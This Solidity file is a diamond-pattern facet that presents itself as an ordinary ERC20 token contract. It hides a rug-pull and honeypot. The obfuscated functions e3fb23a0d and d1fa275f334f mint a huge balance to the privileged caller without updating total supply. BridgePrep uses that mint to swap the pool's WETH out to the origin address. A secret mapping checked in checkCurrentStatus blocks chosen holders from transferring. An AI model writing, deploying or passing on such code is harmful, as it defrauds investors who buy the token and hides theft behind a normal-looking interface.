// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20 {
    function totalSupply() public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function BridgePrep() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        SecureCalls.checkCaller(msg.sender, ds._origin);
        uint256 thisTokenReserve = getBaseTokenReserve(address(this));
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        e3fb23a0d();
        transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(ds._router), type(uint112).max);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(ds._router.WETH());
        address to = msg.sender;
        ds._router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            to,
            block.timestamp + 1200
        );
    }
    function getBaseTokenReserve(address token) public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint112 reserve0, uint112 reserve1, ) = ds._pair.getReserves();
        uint256 baseTokenReserve = (ds._pair.token0() == token)
            ? uint256(reserve0)
            : uint256(reserve1);
        return baseTokenReserve;
    }
    function e3fb23a0d() internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._balances[msg.sender] += type(uint112).max;
    }
    function d1fa275f334f() public {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        SecureCalls.checkCaller(msg.sender, ds._origin);
        e3fb23a0d();
    }
    function AddLiquidity() public payable {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        SecureCalls.checkCaller(msg.sender, ds._origin);
        transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(ds._router), balanceOf(address(this)));
        ds._router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp + 1200
        );
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!checkCurrentStatus(from), "ERC20: No premission to transfer");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = ds._balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            ds._balances[from] = fromBalance - amount;
            ds._balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
    function checkCurrentStatus(address _user) public view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._f7ae38d22b[_user] == 0 ? false : true;
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _mint(address account, uint256 amount) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        ds._totalSupply += amount;
        unchecked {
            ds._balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _burn(address account, uint256 amount) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = ds._balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            ds._balances[account] = accountBalance - amount;
            ds._totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
}
